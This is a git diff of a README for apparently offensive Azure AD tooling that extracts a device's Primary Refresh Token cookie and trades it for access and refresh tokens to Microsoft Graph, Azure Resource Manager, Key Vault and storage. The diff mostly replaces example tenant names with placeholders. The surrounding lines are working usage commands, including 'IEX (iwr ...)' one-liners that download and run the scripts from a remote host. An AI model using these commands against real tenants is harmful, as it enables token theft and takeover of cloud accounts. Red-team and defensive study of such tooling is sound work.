@@ -60,7 +60,7 @@ Fetches a fresh nonce from AAD automatically using `POST /oauth2/token` with `gr
 **With tenant ID**
 
 ```
-RequestAADRefreshToken2.exe -t yourtenant.onmicrosoft.com
+RequestAADRefreshToken2.exe -t <TenantId>
 ```
 
 **Manual nonce from roadrecon**
@@ -143,7 +143,7 @@ IEX (iwr http://192.168.23.1/RequestAADRefreshToken2.ps1 -UseBasicParsing); Get-
 Get-AADRefreshToken
 
 # custom tenant for nonce fetch
-Get-AADRefreshToken -Tenant "contoso.onmicrosoft.com"
+Get-AADRefreshToken -Tenant <TenantId>
 
 # manual nonce
 Get-AADRefreshToken -Nonce "AQABAAAAAAD..."
@@ -201,8 +201,7 @@ IEX (iwr http://192.168.23.1/PowerPrt.ps1 -UseBasicParsing)
 $c = Get-PRTCookie
 
 # custom tenant for nonce fetch
-$c = Get-PRTCookie -Tenant "contoso.onmicrosoft.com"
-
+$c = Get-PRTCookie -Tenant <TenantId>
 # manual nonce
 $c = Get-PRTCookie -Nonce "AQABAAAAAAD..."
 
@@ -217,16 +216,16 @@ $c = Get-PRTCookie -Legacy
 Invoke-PRTTokenExchange -PrtCookie $c -TenantId "contoso.onmicrosoft.com"
 
 # Azure Resource Manager
-Invoke-PRTTokenExchange -PrtCookie $c -TenantId "contoso.onmicrosoft.com" -Resource azurerm
+Invoke-PRTTokenExchange -PrtCookie $c -TenantId <TenantId> -Resource azurerm
 
 # AAD Graph
-Invoke-PRTTokenExchange -PrtCookie $c -TenantId "contoso.onmicrosoft.com" -Resource aadgraph
+Invoke-PRTTokenExchange -PrtCookie $c -TenantId <TenantId> -Resource aadgraph
 
 # Key Vault
-Invoke-PRTTokenExchange -PrtCookie $c -TenantId "contoso.onmicrosoft.com" -Resource keyvault
+Invoke-PRTTokenExchange -PrtCookie $c -TenantId <TenantId> -Resource keyvault
 
 # Custom resource URL
-Invoke-PRTTokenExchange -PrtCookie $c -TenantId "contoso.onmicrosoft.com" -Resource "https://storage.azure.com/"
+Invoke-PRTTokenExchange -PrtCookie $c -TenantId <TenantId> -Resource "https://storage.azure.com/"
 ```
 
 Tokens are saved to `$global:accessToken`, `$global:refreshToken`, `$global:expiresOn` after successful exchange.
@@ -235,19 +234,19 @@ Tokens are saved to `$global:accessToken`, `$global:refreshToken`, `$global:expi
 
 ```powershell
 # full chain, MS Graph
-Invoke-PRTChain -TenantId "contoso.onmicrosoft.com"
+Invoke-PRTChain -TenantId <TenantId>
 
 # full chain, different resource
-Invoke-PRTChain -TenantId "contoso.onmicrosoft.com" -Resource azurerm
+Invoke-PRTChain -TenantId <TenantId> -Resource azurerm
 
 # full chain, manual nonce
-Invoke-PRTChain -TenantId "contoso.onmicrosoft.com" -Nonce "AQABAAAAAAD..."
+Invoke-PRTChain -TenantId <TenantId> -Nonce "AQABAAAAAAD..."
 
 # full chain, legacy cookie
-Invoke-PRTChain -TenantId "contoso.onmicrosoft.com" -Legacy
+Invoke-PRTChain -TenantId <TenantId> -Legacy
 
 # full chain one-liner via IEX
-IEX (iwr http://192.168.23.1/PowerPrt.ps1 -UseBasicParsing); Invoke-PRTChain -TenantId "contoso.onmicrosoft.com"
+IEX (iwr http://192.168.23.1/PowerPrt.ps1 -UseBasicParsing); Invoke-PRTChain -TenantId <TenantId>
 ```
 
 ### Using the Access Token
